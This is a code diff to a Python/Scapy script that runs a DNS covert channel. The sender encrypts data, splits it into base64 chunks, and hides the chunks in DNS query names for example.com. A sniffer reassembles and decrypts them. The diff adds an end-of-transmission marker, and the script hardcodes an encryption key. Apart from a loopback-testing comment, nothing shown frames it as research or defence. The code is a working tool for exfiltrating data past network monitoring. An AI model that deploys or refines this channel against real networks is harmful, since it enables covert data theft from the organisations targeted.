@@ -15,6 +15,7 @@ DOMAIN = "example.com"  # Domain for DNS queries
 dns_servers = ["127.0.0.1"]  # Use loopback IP address for testing
 received_chunks = []
 SECRET_KEY = "mysecretkey12345"  # Key for encryption and decryption
+END_MARKER = "<END>"  # Marker to indicate end of transmission
 
 # Function to handle incoming DNS packets
 def dns_sniffer(packet):
@@ -36,14 +37,20 @@ def dns_sniffer(packet):
                         except ValueError as e:
                             print(f"[Sniffer] Failed to decode chunk: {data_chunk}, error: {e}")
 
-                # Print the current reassembled payload
-                reassembled_payload = ''.join(received_chunks)
-                try:
-                    # Decrypt the reassembled payload
-                    decrypted_payload = decrypt_payload(reassembled_payload)
-                    print(f"[Sniffer] Reassembled and Decrypted Payload: {decrypted_payload}")
-                except Exception as e:
-                    print(f"[Sniffer] Failed to decrypt reassembled payload, error: {e}")
+                # Check if the end marker is present
+                if END_MARKER in received_chunks:
+                    # Remove the end marker
+                    received_chunks.remove(END_MARKER)
+                    # Print the current reassembled payload
+                    reassembled_payload = ''.join(received_chunks)
+                    try:
+                        # Decrypt the reassembled payload
+                        decrypted_payload = decrypt_payload(reassembled_payload)
+                        print(f"[Sniffer] Reassembled and Decrypted Payload: {decrypted_payload}")
+                    except Exception as e:
+                        print(f"[Sniffer] Failed to decrypt reassembled payload, error: {e}")
+                    # Clear received chunks for the next payload
+                    received_chunks.clear()
         except IndexError as e:
             print(f"[Sniffer] Failed to process packet: {e}")
         except Exception as e:
@@ -79,6 +86,14 @@ def send_covert_payload(payload, domain=DOMAIN):
         print(f"[Sender] Sending DNS query: {query_domain}")
         send(packet, verbose=False)
         time.sleep(random.uniform(0.5, 1.0))  # Reduced delay for more efficient transmission
+    
+    # Send an end marker to indicate the end of the transmission
+    end_marker_chunk = base64.urlsafe_b64encode(END_MARKER.encode()).decode().rstrip('=')
+    random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
+    query_domain = f"{random_label}-{end_marker_chunk}.{domain}"
+    packet = IP(dst=random.choice(dns_servers)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain))
+    print(f"[Sender] Sending end marker DNS query: {query_domain}")
+    send(packet, verbose=False)
 
 # Encryption function
 def encrypt_payload(payload):
